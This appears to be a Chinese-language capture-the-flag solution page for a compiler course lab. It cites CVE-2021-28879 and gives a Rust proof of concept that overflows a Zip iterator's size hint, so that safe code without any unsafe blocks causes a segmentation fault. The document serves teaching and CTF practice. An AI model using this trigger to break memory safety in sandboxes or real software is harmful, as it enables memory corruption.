# 编原译理习题课 · 实验班

> 第二阶段提示后完成。

## Flag 1

参考 [CVE-2021-28879](https://rustsec.org/advisories/CVE-2021-28879.html)，使用下面的[示例](https://play.rust-lang.org/?version=stable&mode=release&edition=2018&gist=0e6f0c70e6aaaba62610f19fd9186756)代码成功触发段错误拿到 Flag 1：

```rust
#![forbid(unsafe_code)]

fn overflowed_zip(arr: &[i32]) -> impl Iterator<Item = (i32, &())> {
    static UNIT_EMPTY_ARR: [(); 0] = [];

    let mapped = arr.into_iter().map(|i| *i);
    let mut zipped = mapped.zip(UNIT_EMPTY_ARR.iter());
    zipped.next();
    zipped
}

pub fn run() {
    let arr = [1, 2, 3];
    let zip = overflowed_zip(&arr).zip(overflowed_zip(&arr));

    dbg!(zip.size_hint());
    for (index, num) in zip.map(|((num, _), _)| num).enumerate() {
        println!("{}: {}", index, num);
    }
}
```
